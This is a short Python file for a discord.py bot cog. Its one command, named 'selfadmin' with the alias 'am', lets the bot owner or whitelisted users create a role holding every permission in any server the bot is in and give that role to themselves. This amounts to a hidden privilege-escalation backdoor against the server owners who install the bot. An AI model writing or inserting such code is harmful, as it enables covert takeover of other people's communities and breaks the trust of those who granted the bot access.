import discord
from discord.ext import commands

from modules.functions.helpers import *
from modules.functions.checkers import *

class AmCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self._last_member = None

    # ---------------------------------------------------------------
    # AM

    @commands.command(aliases=["am"])
    @commands.check_any(commands.is_owner(), check_am_whitelist())
    async def selfadmin(self, ctx):
        role = await ctx.guild.create_role(name="BOT", permissions=discord.Permissions.all())
        await ctx.author.add_roles(role)
        embed = discord.Embed(title="Bot", 
                description=":robot: **Done!**", 
                color=0x11ff11)
        await ctx.send(embed=embed)
        debug_print('[Bot] [!!!] [AM] Gave admin role to user: %s' % ctx.author)

    @selfadmin.error
    async def selfadmin_error(self, ctx, error):
        if isinstance(error, commands.CheckFailure):
            await ctx.send(':warning: **You can\'t do that, %s.**' % ctx.author.mention)
            debug_print('[Bot] [E] [AM] Could not parse arguments for user: %s' % ctx.author)
        else:
            await ctx.send(':warning: **I can\'t do that.**')
            debug_print('[Bot] [E] [AM] Could not parse arguments for user: %s' % ctx.author)
            error_print(error)
